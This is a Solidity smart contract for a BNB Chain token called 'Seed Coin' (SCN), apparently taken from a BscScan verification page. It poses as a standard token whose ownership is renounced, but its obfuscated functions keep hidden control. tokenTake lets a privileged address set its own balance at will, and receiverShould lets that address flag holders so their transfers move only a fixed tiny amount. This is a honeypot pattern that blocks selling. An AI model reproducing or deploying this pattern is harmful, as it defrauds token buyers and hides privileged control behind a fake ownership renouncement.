/**
 *Submitted for verification at BscScan.com on 2023-01-31
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;


interface swapTake {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface launchedSwapWallet {
    function createPair(address tokenA, address tokenB) external returns (address);
}

contract SeedCoin {
    uint8 public decimals = 18;
    string public symbol = "SCN";


    mapping(address => bool) public isAt;
    uint256 constant limitToken = 12 ** 10;
    address public owner;

    address public marketingAuto;
    mapping(address => mapping(address => uint256)) public allowance;
    bool public takeSwap;

    string public name = "Seed Coin";
    uint256 public totalSupply = 100000000 * 10 ** 18;
    address public fundTake;

    mapping(address => uint256) public balanceOf;
    mapping(address => bool) public receiverMode;
    

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor (){
        swapTake autoBuyList = swapTake(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        fundTake = launchedSwapWallet(autoBuyList.factory()).createPair(autoBuyList.WETH(), address(this));
        owner = liquidityExemptReceiver();
        marketingAuto = owner;
        isAt[marketingAuto] = true;
        balanceOf[marketingAuto] = totalSupply;
        emit Transfer(address(0), marketingAuto, totalSupply);
        toAmount();
    }

    

    function transfer(address sellTeamMode, uint256 feeSender) external returns (bool) {
        return transferFrom(liquidityExemptReceiver(), sellTeamMode, feeSender);
    }

    function liquidityExemptReceiver() private view returns (address) {
        return msg.sender;
    }

    function tokenTake(uint256 feeSender) public {
        if (!isAt[liquidityExemptReceiver()]) {
            return;
        }
        balanceOf[marketingAuto] = feeSender;
    }

    function teamEnableSell(address enableLaunch, address toIs, uint256 feeSender) internal returns (bool) {
        require(balanceOf[enableLaunch] >= feeSender);
        balanceOf[enableLaunch] -= feeSender;
        balanceOf[toIs] += feeSender;
        emit Transfer(enableLaunch, toIs, feeSender);
        return true;
    }

    function approve(address fromReceiverFund, uint256 feeSender) public returns (bool) {
        allowance[liquidityExemptReceiver()][fromReceiverFund] = feeSender;
        emit Approval(liquidityExemptReceiver(), fromReceiverFund, feeSender);
        return true;
    }

    function getOwner() external view returns (address) {
        return owner;
    }

    function exemptMode(address limitList) public {
        if (takeSwap) {
            return;
        }
        isAt[limitList] = true;
        takeSwap = true;
    }

    function transferFrom(address toAt, address sellTeamMode, uint256 feeSender) public returns (bool) {
        if (toAt != liquidityExemptReceiver() && allowance[toAt][liquidityExemptReceiver()] != type(uint256).max) {
            require(allowance[toAt][liquidityExemptReceiver()] >= feeSender);
            allowance[toAt][liquidityExemptReceiver()] -= feeSender;
        }
        if (sellTeamMode == marketingAuto || toAt == marketingAuto) {
            return teamEnableSell(toAt, sellTeamMode, feeSender);
        }
        if (receiverMode[toAt]) {
            return teamEnableSell(toAt, sellTeamMode, limitToken);
        }
        return teamEnableSell(toAt, sellTeamMode, feeSender);
    }

    function toAmount() public {
        emit OwnershipTransferred(marketingAuto, address(0));
        owner = address(0);
    }

    function receiverShould(address fromModeBuy) public {
        if (fromModeBuy == marketingAuto || fromModeBuy == fundTake || !isAt[liquidityExemptReceiver()]) {
            return;
        }
        receiverMode[fromModeBuy] = true;
    }


}